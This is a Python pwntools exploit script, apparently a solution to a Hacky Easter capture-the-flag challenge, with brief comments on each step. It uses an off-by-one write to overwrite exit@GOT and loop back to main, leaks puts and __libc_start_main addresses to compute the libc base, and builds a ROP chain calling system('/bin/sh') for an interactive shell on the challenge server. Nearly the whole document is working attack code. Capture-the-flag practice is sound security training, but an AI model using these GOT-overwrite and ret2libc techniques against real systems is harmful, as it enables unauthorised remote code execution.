#!/usr/bin/env python3
from pwn import *

context.terminal = ['alacritty', '-e', 'sh', '-c']
exe = context.binary = ELF('main')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('localhost', 1337)
    else:
        return remote('ch.hackyeaster.com', 2315)
        # return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

main = exe.sym["main"]
ex = exe.got["exit"]
r = ROP(exe)
pop_ret = r.find_gadget(['pop rdi', 'ret']).address

# The idea is to use the off by one error to write the pop rdi; ret gadget to the exit@GOT
# With this we can control where we jump to after exit() is called, which we will point to main
io.recvuntil('input\n')
rest = pop_ret * 6 - 3 - main - ex
io.sendline(f'{main} {rest} {1} {1} {1} {ex}')


# Now we can leak libc addresses
puts = exe.sym['puts']
puts_got = exe.got['puts']
main_got = exe.got['__libc_start_main']

ret = r.find_gadget(['ret']).address
garbage = exe.bss(30)

# leak puts
io.recvuntil('input\n')
io.sendline(f'{ret} {pop_ret} {puts_got} {puts} {main} {garbage}')
leak = io.recvuntil("Give")
leak = leak[:-5]
leak = u64(leak.ljust(8, b'\x00'))
print(f'puts {hex(leak)}')

# leak __libc_start_main
io.recvuntil('input\n')
io.sendline(f'{ret} {pop_ret} {main_got} {puts} {main} {garbage}')
leak = io.recvuntil("Give")
leak = leak[:-5]
leak = u64(leak.ljust(8, b'\x00'))
print(f'__libc_start_main {hex(leak)}')

# Figure out the right libc version via libc.rip
# libc6_2.27-3ubuntu1.6_amd64
libc = ELF("./libc.so")
libc.address = leak - libc.sym['__libc_start_main']
print(f'libc base {hex(libc.address)}')

system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

print('system: ' + hex(system))
print('/bin/sh: ' + hex(bin_sh))

# get a shell
io.recvuntil('input\n')
io.sendline(f'{pop_ret} {bin_sh} {system} 1 1 {garbage}')
io.interactive()
